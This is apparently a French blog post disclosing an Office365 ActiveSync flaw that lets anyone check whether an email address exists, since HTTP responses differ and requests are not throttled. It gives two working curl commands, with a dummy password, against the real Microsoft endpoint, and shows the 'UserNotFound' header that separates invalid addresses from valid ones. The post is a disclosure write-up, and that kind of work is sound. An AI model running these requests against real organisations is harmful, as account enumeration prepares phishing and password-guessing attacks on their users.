---
layout: post
title: Office365 / Fuite de données - Énumération d'adresses mail valides
tags: [Office365, Sécurité, Cloud]
---

Le service ActiveSync d'Office365 présente une faille permettant de vérifier la validité des adresses mail d'un domaine (si l'adresse mail est utilisée en tant qu'identifiant). Les retours HTTP sont en effet différents en fonction de l'existence ou non d'un identifiant spécifique.

Ce problème a initialement été signalé ici : [https://www.sec-1.com/blog/2017/office365-activesync-username-enumeration](https://www.sec-1.com/blog)

Prévenu par l'auteur fin juin 2017, Microsoft n'a pas jugé ce problème suffisamment critique pour prévoir un correctif.

L'url ActiveSync d'Office365 (https://outlook.office365.com/Microsoft-Server-ActiveSync) ne semble par ailleurs pas être protégée par un système de throttling permettant d'éviter les requêtes trop nombreuses sur une période donnée, ce qui laisse la porte ouverte à une exploitation massive.

## Exemples

**Adresse e-mail valide (prenom.nom@mondomaine.fr)**

```bash
$ auth=$(echo -n 'prenom.nom@mondomaine.fr:motdepassebidon' | base64); curl -v -X OPTIONS \
-H "OPTIONS /Microsoft-Server-ActiveSync HTTP/1.1" -H "Host: outlook.office365.com" \
-H "Connection: close" -H "MS-ASProtocolVersion: 14.0" -H "Content-Length: 0" \
-H "Authorization: Basic $auth" https://outlook.office365.com/Microsoft-Server-ActiveSync \
2>&1 | grep "X-CasErrorCode"
<pas de retour>
```

**Adresse e-mail inexistante (prenom.nom.bidon@mondomaine.fr)**

```bash
$ auth=$(echo -n 'prenom.nom.bidon@mondomaine.fr:motdepassebidon' | base64); curl -v \
-X OPTIONS -H "OPTIONS /Microsoft-Server-ActiveSync HTTP/1.1" -H "Host: outlook.office365.com" \
-H "Connection: close" -H "MS-ASProtocolVersion: 14.0" -H "Content-Length: 0" \
-H "Authorization: Basic $auth" https://outlook.office365.com/Microsoft-Server-ActiveSync \
2>&1 | grep "X-CasErrorCode"
< X-CasErrorCode: UserNotFound
```
